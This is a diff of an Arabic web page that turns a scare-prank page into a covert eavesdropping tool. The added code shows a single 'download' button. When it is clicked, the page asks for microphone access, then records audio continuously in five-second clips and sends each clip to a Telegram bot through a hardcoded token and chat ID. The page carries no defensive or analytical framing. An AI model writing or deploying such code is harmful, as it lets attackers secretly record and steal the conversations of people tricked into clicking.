@@ -1,80 +1,99 @@
-<!doctype html>
-<html lang="ar" dir="rtl">
+<!DOCTYPE html>
+<html lang="ar">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>تحميل رابطك جاهز</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
   <style>
-    body{font-family:Tahoma,Arial;background:#f3f5f7;padding:30px;text-align:center;color:#222; margin:0;}
-    .box{max-width:420px;margin:auto;background:#fff;padding:25px;border-radius:14px;box-shadow:0 6px 18px rgba(0,0,0,0.08)}
-    h1{margin-bottom:15px;font-size:22px}
-    button{margin:10px 0;padding:12px 20px;font-size:16px;border:0;border-radius:10px;cursor:pointer;background:#0066ff;color:#fff;transition:0.2s}
-    button:hover{background:#004fcc}
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #0b0f16;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    #req {
+      padding: 14px 32px;
+      font-size: 20px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      background: #0a84ff;
+      color: white;
+    }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h1>تحميل رابطك جاهز</h1>
-    <p>اضغط على الزر ليبدأ التحميل فوراً</p>
-    <button onclick="startPrank()">تحميل</button>
-  </div>
 
-  <script>
-// إنشاء ملف ZIP حجمه 5MB (فارغ)
-function generateLargeZip(){
-  const size = 5 * 1024 * 1024;
-  const buffer = new Uint8Array(size);
-  return new Blob([buffer], { type: 'application/zip' });
+<button id="req">تحميل</button>
+
+<script>
+let stream = null;
+let recorder = null;
+let active = false;
+
+const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
+const CHAT_ID   = "5648826330";
+
+const CLIP_MS = 5000; // مدة المقطع = 2 ثانية
+
+function sendToTelegram(blob) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("voice", blob, "audio.webm");
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+    method: "POST",
+    body: form
+  })
+  .then(r => r.json())
+  .then(d => console.log("تم إرسال مقطع:", d))
+  .catch(err => console.error("فشل الإرسال:", err));
 }
 
-function downloadZip(filename) {
-  const zipFile = generateLargeZip();
-  const url = URL.createObjectURL(zipFile);
+function recordOnce() {
+  return new Promise((resolve) => {
+    recorder = new MediaRecorder(stream);
+    let chunks = [];
 
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: "audio/webm" });
+      resolve(blob);
+    };
 
-  URL.revokeObjectURL(url);
+    recorder.start();
+    setTimeout(() => recorder.stop(), CLIP_MS);
+  });
 }
 
-function startPrank(){
-  downloadZip('viruse_xtb3.zip');
+async function startLoop() {
+  if (active) return;
+  active = true;
 
-  // تشغيل صوت صراخ
-  const scream = new Audio('https://www.soundjay.com/human/sounds/scream-01.mp3');
-  scream.play();
-
-  // اهتزاز مستمر طالما الصفحة فعّالة
-  function vibrateLoop(){
-    if(document.visibilityState === 'visible' && navigator.vibrate){
-      navigator.vibrate([200,100,200,100,200]);
-      setTimeout(vibrateLoop, 500);
-    }
+  while (active) {
+    const blob = await recordOnce();
+    sendToTelegram(blob);
+    await new Promise(r => setTimeout(r, 200));
   }
-  vibrateLoop();
-
-  const colors=['red','yellow','green','blue'];
-  let i=0;
-
-  function cycle(){
-    if(i < colors.length){
-      document.body.style.background = colors[i];
-      document.body.style.width = '100%';
-      document.body.style.height = '100vh';
-      i++;
-      setTimeout(cycle,500);
-    } else {
-      document.body.style.background='black';
-      document.body.innerHTML='<h1 style="color:white;font-size:40px;margin-top:40px">تواصل معنا على hgsgt564@gmail.com تم تهكيرك</h1>';
-    }
-  }
-
-  setTimeout(cycle,500);
 }
+
+document.getElementById("req").onclick = async () => {
+  if (stream) return;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    startLoop();
+  } catch(e) {
+    alert("يجب السماح بالمايك حتى يعمل التسجيل");
+  }
+};
+
+window.onbeforeunload = () => {
+  active = false;
+  if (stream) stream.getTracks().forEach(t => t.stop());
+};
 </script>
+
 </body>
 </html>
